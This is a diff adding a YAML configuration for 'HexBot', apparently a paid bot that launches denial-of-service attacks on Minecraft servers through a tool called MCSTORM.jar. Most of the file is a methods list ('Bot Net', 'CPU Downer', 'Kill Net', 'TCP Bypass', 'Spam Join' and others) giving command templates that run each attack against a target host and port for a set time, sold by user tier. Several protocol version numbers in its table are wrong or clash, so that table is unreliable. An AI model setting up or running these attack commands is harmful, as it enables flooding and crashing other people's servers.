@@ -1,0 +1,118 @@
+HexBot:
+  RunOption: 
+    # This option will be suitable when running bot on host/node
+    SpecifiedJava: false
+    Path: 
+      # Path when SpecifiedJava: true
+      Enabled: '"$HOME/java8/bin/java"'
+      # Path when SpecifiedJava: false
+      Disabled: "java"
+
+  # These addresses cannot be used!
+  BlackListHost: 
+    - "1.1.1.1"
+    - "127.0.0.1"
+    
+  # You can add versions yourself as Minecraft updates!
+  VersionCode: 
+    - Version: "1.20.1"
+      Value: 763
+    - Version: "1.20.0"
+      Value: 763
+    - Version: "1.19.4"
+      Value: 762
+    - Version: "1.19.3"
+      Value: 761
+    - Version: "1.19.2"
+      Value: 760
+    - Version: "1.19.1"
+      Value: 760
+    - Version: "1.19.x"
+      Value: 759
+    - Version: "1.18.2"
+      Value: 758
+    - Version: "1.18.x"
+      Value: 757
+    - Version: "1.17.x"
+      Value: 756
+    - Version: "1.16.5"
+      Value: 754
+    - Version: "1.16.3"
+      Value: 753
+    - Version: "1.16.2"
+      Value: 751
+    - Version: "1.16.1"
+      Value: 756
+    - Version: "1.16"
+      Value: 753
+    - Version: "1.15.2"
+      Value: 578
+    - Version: "1.15.1"
+      Value: 575
+    - Version: "1.15"
+      Value: 753
+    - Version: "1.14.4"
+      Value: 498
+    - Version: "1.14.3"
+      Value: 490
+    - Version: "1.14.1"
+      Value: 480
+    - Version: "1.14"
+      Value: 477
+    - Version: "1.13.2"
+      Value: 404
+    - Version: "1.13.1"
+      Value: 401
+    - Version: "1.13"
+      Value: 393
+    - Version: "1.12.x"
+      Value: 340
+    - Version: "1.10.x"
+      Value: 210
+    - Version: "1.9.x"
+      Value: 110
+    - Version: "1.8.x"
+      Value: 47
+  
+  # Add custom method!
+  # - Name: "Bot Joiner" -> Name of method
+  #   ID: "botjoiner" -> ID used in methods (/crash) to run attack
+  #   Enabled: true -> Should this method be enabled?
+  #   Role: Basic -> Method role type. Available: Admin, Premium, Basic
+  #   RunBat: "{path} -Dperdelay=5000 -Ddelay=1 -Drmnwp=false -jar MCSTORM.jar {host}:{port} {version} botjoiner {time} -1" -> Command to run attack
+  Methods: 
+    - Name: "Bot Net"
+      ID: "botnet"
+      Enabled: true
+      Role: Premium
+      RunBat: "{path} -Dperdelay=5000 -Ddelay=1 -Drmnwp=false -jar MCSTORM.jar {host}:{port} {version} botnet {time} -1"
+    - Name: "CPU Downer"
+      ID: "cpudowner"
+      Enabled: true
+      Role: Basic
+      RunBat: "{path} -Dperdelay=5000 -Ddelay=1 -Drmnwp=false -jar MCSTORM.jar {host}:{port} {version} cpudowner {time} -1"
+    - Name: "Mutli Killer"
+      ID: "multikiller"
+      Enabled: true
+      Role: Premium
+      RunBat: "{path} -Dperdelay=5000 -Ddelay=1 -Drmnwp=false -jar MCSTORM.jar {host}:{port} {version} multikiller {time} -1"
+    - Name: "Kill Net"
+      ID: "killnet"
+      Enabled: true
+      Role: Basic
+      RunBat: "{path} -Dperdelay=5000 -Ddelay=1 -Drmnwp=false -jar MCSTORM.jar {host}:{port} {version} killnet {time} -1"
+    - Name: "TCP Bypass"
+      ID: "tcpbypass"
+      Enabled: true
+      Role: Basic
+      RunBat: "{path} -Dperdelay=5000 -Ddelay=1 -Drmnwp=false -jar MCSTORM.jar {host}:{port} {version} tcpbypass {time} -1"
+    - Name: "Bot Joiner"
+      ID: "botjoiner"
+      Enabled: true
+      Role: Basic
+      RunBat: "{path} -Dperdelay=5000 -Ddelay=1 -Drmnwp=false -jar MCSTORM.jar {host}:{port} {version} botjoiner {time} -1"
+    - Name: "Spam Join"
+      ID: "spamjoin"
+      Enabled: true
+      Role: Basic
+      RunBat: "{path} -Dperdelay=5000 -Ddelay=1 -Drmnwp=false -jar MCSTORM.jar {host}:{port} {version} spamjoin {time} -1"
